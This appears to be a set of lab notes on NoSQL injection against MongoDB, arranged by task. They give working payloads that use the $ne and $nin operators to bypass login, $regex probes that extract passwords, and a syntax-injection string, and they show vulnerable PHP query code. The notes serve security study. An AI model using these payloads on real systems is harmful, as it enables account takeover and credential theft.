# NoSQL Injection

---

## TASK 2: What is NoSQL?

NoSQL databases, such as MongoDB, use structured arrays for queries. Examples:

- Filter documents where `last_name` is "Sandler":

```json
{"last_name": "Sandler"}
```

- Filter documents where `gender` is male and `last_name` is "Phillips":

```json
{"gender": "male", "last_name": "Phillips"}
```

- Filter documents where `age` is less than 50:

```json
{"age": {"$lt": 50}}
```

---

## TASK 3: NoSQL Injection

### Types of NoSQL Injection

1. **Syntax Injection**: Similar to SQL injection, but uses NoSQL syntax.
2. **Operator Injection**: Injects NoSQL query operators to manipulate query behavior.

Example vulnerable PHP code:

```php
$q = new MongoDB\Driver\Query(['username'=>$user, 'password'=>$pass]);
```

Payload:

```json
{"username": {"$ne": "xxxx"}, "password": {"$ne": "yyyy"}}
```

---

## TASK 5: Operator Injection - Logging in as Other Users

Use the `$nin` operator to exclude specific users:

```json
{"username": {"$nin": ["admin", "jude"]}, "password": {"$ne": "aweasdf"}}
```

---

## TASK 6: Operator Injection - Extracting Users' Passwords

Use the `$regex` operator to guess password length and content:

- Guess password length:

```json
{"username": "admin", "password": {"$regex": "^.{7}$"}}
```

- Guess password content:

```json
{"username": "admin", "password": {"$regex": "^c....$"}}
```

---

## TASK 7: Syntax Injection - Identification and Data Extraction

Example payload:

```json
{"username": "admin'||1||'"}
```

---

## Appendix

---